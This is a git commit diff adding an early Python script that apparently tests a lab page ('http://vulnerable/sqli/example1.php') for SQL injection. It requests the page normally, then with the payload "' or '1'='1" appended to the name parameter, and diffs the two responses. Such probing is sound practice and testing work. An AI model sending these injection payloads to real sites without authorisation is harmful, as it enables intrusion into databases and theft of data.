b3d309472deff9b7fdbe1bf0ab13f24a43abbd3a
Igor Eržiak <igor.erziak@orchestr8.com>
2018-12-17 07:00:17 +0100

    initial changes

--- main.py
+++ main.py
@@ -1,7 +1,31 @@
+import urllib.parse
+import urllib.request
+import difflib
+
 # specify URL to connect to
+base_url = "http://vulnerable/sqli/example1.php?{}"
 
-# specify type of attack, field to attack etc.
+args = {"name":"root"}
 
-# get the responses from the URL with specified parameters
+url = base_url.format(urllib.parse.urlencode(args))
 
-# compare all the responses and based on the differences, get some data
+
+with urllib.request.urlopen(url) as u:
+	gen_content = list(u.read().decode("utf-8").split('\n'))
+
+
+name = "root"
+fuzz_string = "\' or \'1\'=\'1"
+args["name"] = name + fuzz_string
+url = base_url.format(urllib.parse.urlencode(args))
+
+with urllib.request.urlopen(url) as u:
+	fuzz_content = list(u.read().decode("utf-8").split('\n'))
+
+# compare the responses
+diff_list = difflib.context_diff(gen_content, fuzz_content)
+
+diff = ""
+for e in diff_list:
+	diff += e
+
